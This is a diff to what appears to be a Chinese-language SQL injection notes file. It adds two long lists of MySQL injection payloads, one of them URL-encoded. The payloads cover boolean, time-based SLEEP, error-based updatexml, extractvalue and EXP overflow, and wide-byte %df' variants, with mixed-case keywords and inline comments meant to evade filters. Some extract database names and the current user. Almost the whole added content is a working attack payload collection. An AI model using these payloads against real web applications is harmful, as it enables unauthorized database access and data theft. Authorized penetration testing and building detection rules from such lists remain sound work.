@@ -601,6 +601,258 @@ SELECT n.*,u.* FROM   aoa_notice_list AS n LEFT JOIN aoa_notice_user_relation AS
 ,(if(1=1,%20sleep/**/(6),0))
 ```
 
-
-
 * `EXP(if(1=1,709,710))` EXP(709)是合法的，而710则会因为值超过DOUBLE的范围而报错。这里既可以用于报错注入也可以布尔注入，布尔注入的原理是通过控制if的条件，从而控制SQL语句是否报错（是否能正常返回值）
+
+```txt
+1%df' AnD SlEeP(5)%23
+1'AnD'1'='1
+1'AnD'm'='a
+1')AnD('m')=('a
+1')AnD('m')=('m
+1-1
+1-0
+1/If(1=1,1,0)
+1/If(1=2,1,0)
+1'/If(1=1,1,0)||'
+1'/If(1=2,1,0)||'
+1')/If(1=1,1,0)||('
+1')/If(1=2,1,0)||('
+1'/If(1=1,1,0) And'1'='1
+1'/If(1=2,1,0) And'1'='1
+1')/If(1=1,1,0)And('1')=('1=
+1')/If(1=2,1,0)And('1')=('1=
+1%df'/If(1=1,1,0)--+
+1%df'/If(1=2,1,0)--+
+1 AnD 0=7
+1 AnD 0=0
+1'||case when 1=1 then 1 else 1/0 end||'
+1'||case when 1=2 then 1 else 1/0 end||'
+1'||case when ascii(substr(user,1,1))=65 then 1 else 1/0 end||'
+1'||case when ascii(substr(user,1,1))=65 then 0 else 1/1 end||'
+1'||case when 1=1 then '' else 'aaaaa' end||'
+1'||case when 1=0 then '' else 'aaaaa' end||'
+1')||case when 1=1 then 1 else 1/0 end||('
+1')||case when 1=2 then 1 else 1/0 end||('
+1')||case when 1=1 then '' else 'aaaaa' end||('
+1')||case when 1=2 then '' else 'aaaaa' end||('
+1||exp(709)
+1||exp(710)
+1'||EXp(710)||'
+1'||EXp(709)||'
+1')||EXp(710)||('
+1')||EXp(709)||('
+1||SlEeP(If(1=1,4,0))
+1||SlEeP(If(1=1,0,4))
+1'||SlEeP(If(1=1,4,0))||'
+1'||SlEeP(If(1=1,0,4))||'
+1')||SlEeP(If(1=1,4,0))||('
+1')||SlEeP(If(1=1,0,4))||('
+1%df'||SlEeP(If(1=1,4,0))--+
+1%df'||SlEeP(If(1=1,0,4))--+
+1/If(1=1,SlEeP(4),0)
+1/If(1=2,SlEeP(4),0)
+1'/If(1=1,SlEeP(4),0)||'
+1'/If(1=2,SlEeP(4),0)||'
+1')/If(1=1,SlEeP(4),0)||('
+1')/If(1=2,SlEeP(4),0)||('
+1%df'/If(1=1,SlEeP(4),0)--+
+1%df'/If(1=2,SlEeP(4),0)--+
+1%df'||EXp(710)--+
+1%df'||EXp(709)--+
+1 RLIKE (SELECT (CASE WHEN (5925=5925) THEN 1 ELSE 0x28 END))
+1 RLIKE (SELECT (CASE WHEN (5925=5924) THEN 1 ELSE 0x28 END))
+1 AnD If(1=2,EXp(710),EXp(709))
+1 AnD If(1=2,EXp(709),EXp(710))
+1 AnD SElEcT If(1=2,EXp(710),EXp(709))
+1 AnD SElEcT If(1=1,EXp(710),EXp(709))
+1'AnD If(1=2,EXp(710),EXp(709))||'
+1'AnD If(1=2,EXp(709),EXp(710))||'
+1'AnD SElEcT If(1=2,EXp(710),EXp(709))||'
+1'AnD SElEcT If(1=1,EXp(710),EXp(709))||'
+1')AnD If(1=2,EXp(710),EXp(709))||('
+1')AnD If(1=2,EXp(709),EXp(710))||('
+1')AnD SElEcT If(1=2,EXp(710),EXp(709))||('
+1')AnD SElEcT If(1=1,EXp(710),EXp(709))||('
+1'AnD If(1=2,EXp(710),EXp(709))And'1'='1
+1'AnD If(1=2,EXp(709),EXp(710))And'1'='1
+1'AnD SElEcT If(1=2,EXp(710),EXp(709))And'1'='1
+1'AnD SElEcT If(1=1,EXp(710),EXp(709))And'1'='1
+1')AnD If(1=2,EXp(710),EXp(709))And('1')=('1=
+1'|uPdaTeXml(1,CoNCAt(0x7e,current_user,0x7e),1)|'
+1'or updatexml(1,if(1=2,1,user()),1)||'
+1')||uPdaTeXml(1,CoNCAt(0x7e,current_user,0x7e),1)||('
+1'AnD uPdaTeXml(1,CoNCAt(0x7e,(SElEcT database()),0x7e),1)--+
+1' Or ExtRacTvaLue(1,CoNCAt(0x7e,(database()))) Or '
+ExtRacTvaLue(1,CoNCAt(char(126),md5(1832632439)))
+1 AnD 1329=(SElEcT (CASE WHEN (ORD(MID((IfNULL(CAST(DATABASE() AS NCHAR),0x20)),1,1))>123) THEN 1329 ELSE (SElEcT 3541 uNIoN SElEcT 9185) END))--+
+1 AnD 1329=(SElEcT (CASE WHEN (ORD(MID((IfNULL(CAST(DATABASE() AS NCHAR),0x20)),1,1))<123) THEN 1329 ELSE (SElEcT 3541 uNIoN SElEcT 9185) END))--+
+1=SlEeP(5)
+1'=SlEeP(5) Or '1
+1'Or SlEeP(5)='1
+1')=SlEeP(5) Or ('1
+1 AnD cast(md5('1500755628')asint)>0
+1'AnD(SElEcT*from(SElEcT SlEeP/**/(5))a/**/uNIoN/**/SElEcT 1)='
+1')AnD(SElEcT*from(SElEcT SlEeP/**/(5))a/**/uNIoN/**/SElEcT 1)=('
+1 AnD (SElEcT 8380 FROM (SElEcT(SlEeP(5)))smWE)
+1) AnD (SElEcT*from(SElEcT(SlEeP(5)))a)--+
+1'AnD (SElEcT 8380 FROM (SElEcT(SlEeP(5)))smWE)
+1/**/AnD 0=7
+1/**/AnD 0=0
+```
+
+```txt
+1%df'%20AnD%20SlEeP(5)%23
+1'AnD'1'='1
+1'AnD'm'='a
+1')AnD('m')=('a
+1')AnD('m')=('m
+1"AnD"c"="c
+1"AnD"c"="g
+1-1
+1-0
+1/If(1=1,1,0)
+1/If(1=2,1,0)
+1'/If(1=1,1,0)||'
+1'/If(1=2,1,0)||'
+1"/If(1=1,1,0)||"
+1"/If(1=2,1,0)||"
+1')/If(1=1,1,0)||('
+1')/If(1=2,1,0)||('
+1")/If(1=1,1,0)||("
+1")/If(1=2,1,0)||("
+1'/If(1=1,1,0)%20And'1'='1
+1'/If(1=2,1,0)%20And'1'='1
+1"/If(1=1,1,0)And"1"="1
+1"/If(1=2,1,0)And"1"="1
+1')/If(1=1,1,0)And('1')=('1=
+1')/If(1=2,1,0)And('1')=('1=
+1")/If(1=1,1,0)And("1")=("1=
+1")/If(1=2,1,0)And("1")=("1=
+1%df'/If(1=1,1,0)--+
+1%df'/If(1=2,1,0)--+
+1 AnD%200=7
+1 AnD%200=0
+1'||case%20when%201=1%20then%201%20else%201/0%20end||'
+1'||case%20when%201=2%20then%201%20else%201/0%20end||'
+1'||case%20when%20ascii(substr(user,1,1))=65%20then%201%20else%201/0%20end||'
+1'||case%20when%20ascii(substr(user,1,1))=65%20then%200%20else%201/1%20end||'
+1'||case%20when%201=1%20then%20''%20else%20'aaaaa'%20end||'
+1'||case%20when%201=0%20then%20''%20else%20'aaaaa'%20end||'
+1"||case%20when%201=1%20then%201%20else%201/0%20end||"
+1"||case%20when%201=2%20then%201%20else%201/0%20end||"
+1"||case%20when%20ascii(substr(user,1,1))=65%20then%201%20else%201/0%20end||"
+1"||case%20when%20ascii(substr(user,1,1))=65%20then%200%20else%201/1%20end||"
+1"||case%20when%201=1%20then%20''%20else%20'aaaaa'%20end||"
+1"||case%20when%201=0%20then%20''%20else%20'aaaaa'%20end||"
+1")||case%20when%201=1%20then%201%20else%201/0%20end||("
+1")||case%20when%201=2%20then%201%20else%201/0%20end||("
+1")||case%20when%201=1%20then%20''%20else%20'aaaaa'%20end||("
+1")||case%20when%201=2%20then%20''%20else%20'aaaaa'%20end||("
+1')||case%20when%201=1%20then%201%20else%201/0%20end||('
+1')||case%20when%201=2%20then%201%20else%201/0%20end||('
+1')||case%20when%201=1%20then%20''%20else%20'aaaaa'%20end||('
+1')||case%20when%201=2%20then%20''%20else%20'aaaaa'%20end||('
+1||exp(709)
+1||exp(710)
+1'||EXp(710)||'
+1'||EXp(709)||'
+1"||EXp(710)||"
+1"||EXp(709)||"
+1")||EXp(710)||("
+1")||EXp(709)||("
+1')||EXp(710)||('
+1')||EXp(709)||('
+1||SlEeP(If(1=1,4,0))
+1||SlEeP(If(1=1,0,4))
+1'||SlEeP(If(1=1,4,0))||'
+1'||SlEeP(If(1=1,0,4))||'
+1"||SlEeP(If(1=1,4,0))||"
+1"||SlEeP(If(1=1,0,4))||"
+1")||SlEeP(If(1=1,4,0))||("
+1")||SlEeP(If(1=1,0,4))||("
+1')||SlEeP(If(1=1,4,0))||('
+1')||SlEeP(If(1=1,0,4))||('
+1%df'||SlEeP(If(1=1,4,0))--+
+1%df'||SlEeP(If(1=1,0,4))--+
+1/If(1=1,SlEeP(4),0)
+1/If(1=2,SlEeP(4),0)
+1'/If(1=1,SlEeP(4),0)||'
+1'/If(1=2,SlEeP(4),0)||'
+1"/If(1=1,SlEeP(4),0)||"
+1"/If(1=2,SlEeP(4),0)||"
+1')/If(1=1,SlEeP(4),0)||('
+1')/If(1=2,SlEeP(4),0)||('
+1")/If(1=1,SlEeP(4),0)||("
+1")/If(1=2,SlEeP(4),0)||("
+1%df'/If(1=1,SlEeP(4),0)--+
+1%df'/If(1=2,SlEeP(4),0)--+
+1%df'||EXp(710)--+
+1%df'||EXp(709)--+
+1 AnD If(1=2,EXp(710),EXp(709))
+1 AnD If(1=2,EXp(709),EXp(710))
+1 AnD SElEcT If(1=2,EXp(710),EXp(709))
+1 AnD SElEcT If(1=1,EXp(710),EXp(709))
+1'AnD If(1=2,EXp(710),EXp(709))||'
+1'AnD If(1=2,EXp(709),EXp(710))||'
+1'AnD SElEcT If(1=2,EXp(710),EXp(709))||'
+1'AnD SElEcT If(1=1,EXp(710),EXp(709))||'
+1"AnD If(1=2,EXp(710),EXp(709))||"
+1"AnD If(1=2,EXp(709),EXp(710))||"
+1"AnD SElEcT If(1=2,EXp(710),EXp(709))||"
+1"AnD SElEcT If(1=1,EXp(710),EXp(709))||"
+1")AnD If(1=2,EXp(710),EXp(709))||("
+1")AnD If(1=2,EXp(709),EXp(710))||("
+1")AnD SElEcT If(1=2,EXp(710),EXp(709))||("
+1")AnD SElEcT If(1=1,EXp(710),EXp(709))||("
+1')AnD If(1=2,EXp(710),EXp(709))||('
+1')AnD If(1=2,EXp(709),EXp(710))||('
+1')AnD SElEcT If(1=2,EXp(710),EXp(709))||('
+1')AnD SElEcT If(1=1,EXp(710),EXp(709))||('
+1'AnD If(1=2,EXp(710),EXp(709))And'1'='1
+1'AnD If(1=2,EXp(709),EXp(710))And'1'='1
+1'AnD SElEcT If(1=2,EXp(710),EXp(709))And'1'='1
+1'AnD SElEcT If(1=1,EXp(710),EXp(709))And'1'='1
+1"AnD If(1=2,EXp(710),EXp(709))And"1"="1
+1"AnD If(1=2,EXp(709),EXp(710))And"1"="1
+1"AnD SElEcT If(1=2,EXp(710),EXp(709))And"1"="1
+1"AnD SElEcT If(1=1,EXp(710),EXp(709))And"1"="1
+1")AnD If(1=2,EXp(710),EXp(709))And("1")=("1=
+1")AnD If(1=2,EXp(709),EXp(710))And("1")=("1=
+1")AnD SElEcT If(1=2,EXp(710),EXp(709))And("1")=("1=
+1")AnD SElEcT If(1=1,EXp(710),EXp(709))And("1")=("1=
+1')AnD If(1=2,EXp(710),EXp(709))And('1')=('1=
+1')AnD If(1=1,EXp(710),EXp(709))And('1')=('1=
+1')AnD If(1=2,EXp(709),EXp(710))And("1")=("1=
+1')AnD SElEcT If(1=2,EXp(710),EXp(709))And('1')=('1=
+1')AnD SElEcT If(1=1,EXp(710),EXp(709))And('1')=('1=
+1"||uPdaTeXml(1,CoNCAt(0x7e,current_user,0x7e),1)||"
+1'|uPdaTeXml(1,CoNCAt(0x7e,current_user,0x7e),1)|'
+1'or updatexml(1,if(1=2,1,user()),1)||'
+1')||uPdaTeXml(1,CoNCAt(0x7e,current_user,0x7e),1)||('
+1")||uPdaTeXml(1,CoNCAt(0x7e,current_user,0x7e),1)||("
+1 RLIKE (SELECT (CASE WHEN (5925=5925) THEN 1 ELSE 0x28 END))
+1 RLIKE (SELECT (CASE WHEN (5925=5924) THEN 1 ELSE 0x28 END))
+1'AnD%20uPdaTeXml(1,CoNCAt(0x7e,(SElEcT%20database()),0x7e),1)--+
+1'%20Or%20ExtRacTvaLue(1,CoNCAt(0x7e,(database())))%20Or%20'
+1"AnDExtRacTvaLue(1,CoNCAt(char(126),md5(1152290333)))AnD"
+ExtRacTvaLue(1,CoNCAt(char(126),md5(1832632439)))
+1%20AnD%201329=(SElEcT%20(CASE%20WHEN%20(ORD(MID((IfNULL(CAST(DATABASE()%20AS%20NCHAR),0x20)),1,1))>123)%20THEN%201329%20ELSE%20(SElEcT%203541%20uNIoN%20SElEcT%209185)%20END))--+
+1%20AnD%201329=(SElEcT%20(CASE%20WHEN%20(ORD(MID((IfNULL(CAST(DATABASE()%20AS%20NCHAR),0x20)),1,1))<123)%20THEN%201329%20ELSE%20(SElEcT%203541%20uNIoN%20SElEcT%209185)%20END))--+
+1=SlEeP(5)
+1'=SlEeP(5)%20Or%20'1
+1"=SlEeP(5)%20Or%20"1
+1'Or%20SlEeP(5)='1
+1')=SlEeP(5)%20Or%20('1
+1")=SlEeP(5)%20Or%20("1
+1 AnD cast(md5('1500755628')asint)>0
+1"AnD(SElEcT*from(SElEcT%20SlEeP/**/(5))a/**/uNIoN/**/SElEcT%201)="
+1'AnD(SElEcT*from(SElEcT%20SlEeP/**/(5))a/**/uNIoN/**/SElEcT%201)='
+1')AnD(SElEcT*from(SElEcT%20SlEeP/**/(5))a/**/uNIoN/**/SElEcT%201)=('
+1")AnD(SElEcT*from(SElEcT%20SlEeP/**/(5))a/**/uNIoN/**/SElEcT%201)=("
+1%20AnD%20(SElEcT%208380%20FROM%20(SElEcT(SlEeP(5)))smWE)
+1)%20AnD%20(SElEcT*from(SElEcT(SlEeP(5)))a)--+
+1'AnD%20(SElEcT%208380%20FROM%20(SElEcT(SlEeP(5)))smWE)
+1/**/AnD%200=7
+1/**/AnD%200=0
+```
+
